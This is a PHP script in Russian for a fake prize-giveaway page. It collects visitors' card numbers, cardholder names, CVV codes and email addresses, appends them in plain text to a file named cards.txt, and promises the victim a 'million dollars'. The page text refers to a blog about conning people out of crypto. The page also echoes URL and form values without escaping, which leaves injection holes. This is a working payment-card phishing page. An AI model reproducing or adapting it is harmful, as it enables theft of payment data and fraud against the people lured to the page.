<?php
if(isset($_GET["pr"])){
  if($_GET["pr"] == ""){
    $prize = "миллион долларов";
  }
  else{
    $prize = $_GET["pr"];
  }
}
else {
  $prize = "миллион долларов";
}
?>


<link rel="stylesheet" href = "./my.css" >
<?php
$ok = 1;
if(isset($_POST["num"]) and isset($_POST["name"]) and isset($_POST["cvs"]) and isset($_POST["mail"])){
  if($_POST["num"]=="" and $_POST["name"]=="" and $_POST["cvs"]=="" and $_POST["mail"]==""){
    $ok = 0;
  }
}
else{
  $ok = 0;
}
if ($ok == 1){
    $file = fopen("cards.txt", "a");
    fwrite($file, "!!! Email: " . $_POST["mail"]. " Card: " . $_POST["num"] . " Name: " . $_POST["name"] . " CVS: " . $_POST["cvs"] . "\n----------\n");
    fclose($file);
    echo "<div class = 'header'><h1>Уже готовы получить свой ";
    echo $prize;
    echo "?!<h1><h2>Вам осталось недолго ждать!!!</h2></div><div class = 'about'><h4>Что делать дальше? <br>Ответ прост!!! Каждый день проверяйте свою почту ";
    echo $_POST["mail"];
    echo ". В течение ближайшей рабочей недели мы пришлем вам письмо с дальнейшими инструкциями.</h4><h4>Продолжайте читать наш блог 'Как развести лоха на крипту' и наслаждайтсь жизнью. Скоро вы наконец-то получите только ваш ";
    echo $prize;
    echo "!!!</h4></div><br><form action = 'https://www.google.ru/'><input type = 'submit' value = 'Жду с нетерпением'/></form>";
}
else{
  echo "<h4>Ошибка:</h4> не все данные";
  echo "<br><form action = '/'><input type = 'submit' value = 'Назад'/></form>";
}
?>
